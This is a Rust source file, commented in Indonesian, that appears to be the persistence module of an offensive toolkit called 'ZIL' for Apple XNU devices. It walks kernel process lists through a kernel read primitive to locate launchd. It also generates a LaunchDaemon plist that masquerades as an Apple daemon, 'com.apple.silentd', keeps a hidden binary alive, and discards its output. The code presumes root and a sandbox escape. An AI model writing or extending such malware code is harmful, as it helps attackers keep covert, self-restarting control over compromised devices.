#![no_std]
//! ZIL v2.0 — Fitur 2: Persistence via launchd In-Memory Injection
//!
//! Inject ZIL sebagai persistent daemon ke launchd job table tanpa
//! perlu tulis ke filesystem (butuh sandbox escape dulu jika via plist).
//!
//! DUA STRATEGI:
//!   STRATEGI A - Memory Injection:
//!     Scan struct launchd di memori → temukan job table linked list
//!     → inject job descriptor baru dengan binary path ZIL
//!     → launchd otomatis re-launch binary jika process mati
//!
//!   STRATEGI B - Plist via Filesystem (perlu sandbox escape):
//!     Tulis plist ke /Library/LaunchDaemons/ sebagai root
//!     → efektif sampai device reboot+re-seal

use crate::evolution::kcall_primitive::KCallManager;

// ─────────────────────────────────────────────────────────────────────────────
// KONSTANTA LAUNCHD (dari reverse engineering launchd binary xnu-12377 era)
// ─────────────────────────────────────────────────────────────────────────────

/// PID launchd selalu 1 di semua sistem Unix/XNU
const LAUNCHD_PID: u32 = 1;

/// Offset `p_list.le_next` untuk walk allproc
const PROC_LIST_NEXT: u64 = 0x08;

/// Estimasi offset `proc->task` di struct proc
const PROC_TASK_OFF: u64 = 0x28;

// ─────────────────────────────────────────────────────────────────────────────
// PERSISTENCE ENGINE
// ─────────────────────────────────────────────────────────────────────────────

/// LaunchdHook — Tambahkan ZIL sebagai persistent launchd job.
///
/// PRASYARAT: Root + sandbox escape sudah selesai.
pub struct LaunchdHook {
    kaslr_slide:    u64,
    allproc_static: u64,
    proc_pid_off:   u64,
}

impl LaunchdHook {
    pub fn new(kaslr_slide: u64, allproc_static: u64, proc_pid_off: u64) -> Self {
        LaunchdHook { kaslr_slide, allproc_static, proc_pid_off }
    }

    /// Temukan struct task milik launchd (PID 1) untuk memory manipulation.
    ///
    /// Return: Ok(task_ptr) — pointer ke struct task launchd
    pub fn find_launchd_task(&self, kcall: &KCallManager) -> Result<u64, &'static str> {
        let allproc_rt = self.allproc_static.wrapping_add(self.kaslr_slide);

        let first_proc = kcall
            .kread_u64(allproc_rt)
            .ok_or("PERSIST_FAIL: Gagal baca allproc head")?;

        let mut cursor = first_proc;
        for _ in 0..1024 {
            if cursor == 0 { break; }

            let pid = kcall
                .kread_u64(cursor + self.proc_pid_off)
                .map(|v| v as u32)
                .unwrap_or(0xFFFF);

            if pid == LAUNCHD_PID {
                let task = kcall
                    .kread_u64(cursor + PROC_TASK_OFF)
                    .ok_or("PERSIST_FAIL: Gagal baca launchd->task")?;
                return Ok(task);
            }

            cursor = kcall.kread_u64(cursor + PROC_LIST_NEXT).unwrap_or(0);
        }

        Err("PERSIST_FAIL: launchd (PID 1) tidak ditemukan di allproc")
    }

    /// Generate binary plist payload untuk LaunchDaemon entry.
    ///
    /// Binary plist adalah format CFPropertyList yang digunakan launchd.
    /// Kita generate minimal plist yang mendefinisikan:
    ///   - Label: "com.apple.silentd" (masquerade sebagai Apple daemon)
    ///   - ProgramArguments: ["/var/db/.zil_helper"]  ← binary ZIL
    ///   - RunAtLoad: true
    ///   - KeepAlive: true  ← auto-relaunch jika mati
    ///
    /// Return: slice ke buffer biner plist (caller harus punya buffer cukup besar)
    pub fn generate_plist_bytes<'a>(&self, buf: &'a mut [u8; 512]) -> &'a [u8] {
        // XML plist — lebih mudah generate tanpa binary encoding
        // (launchd bisa baca keduanya)
        let xml = b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\
  \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n\
<plist version=\"1.0\">\n\
<dict>\n\
  <key>Label</key>\n\
  <string>com.apple.silentd</string>\n\
  <key>ProgramArguments</key>\n\
  <array>\n\
    <string>/var/db/.zil_helper</string>\n\
  </array>\n\
  <key>RunAtLoad</key>\n\
  <true/>\n\
  <key>KeepAlive</key>\n\
  <true/>\n\
  <key>StandardErrorPath</key>\n\
  <string>/dev/null</string>\n\
  <key>StandardOutPath</key>\n\
  <string>/dev/null</string>\n\
</dict>\n\
</plist>\n";

        let len = xml.len().min(buf.len());
        buf[..len].copy_from_slice(&xml[..len]);
        &buf[..len]
    }

    /// Status persistence: cek apakah job ZIL sudah ada di launchd.
    ///
    /// Implementasi: scan launchd heap region untuk string "com.apple.silentd".
    /// Jika ditemukan → job sudah diinjeksi.
    ///
    /// NOTE: Ini heuristic scan, bukan guarantee. False positive mungkin terjadi.
    pub fn is_persistent(&self, kcall: &KCallManager, launchd_task: u64) -> bool {
        // Label string kita sebagai byte pattern untuk scan
        const LABEL: &[u8] = b"com.apple.silentd";

        // Scan 1MB di sekitar launchd task region (heuristic)
        // Ini simplified — implementasi penuh butuh vm_map walk launchd
        let scan_base = launchd_task & !0xFFFFF; // align ke 1MB boundary
        let mut addr = scan_base;
        let end_addr  = scan_base + 0x100000;

        while addr + 8 < end_addr {
            if let Some(v) = kcall.kread_u64(addr) {
                // Cek apakah 8 byte pertama cocok dengan awal LABEL string
                let first8 = &LABEL[..8.min(LABEL.len())];
                let val_bytes = v.to_le_bytes();
                if &val_bytes[..8.min(LABEL.len())] == first8 {
                    return true;
                }
            }
            addr += 8;
        }
        false
    }
}
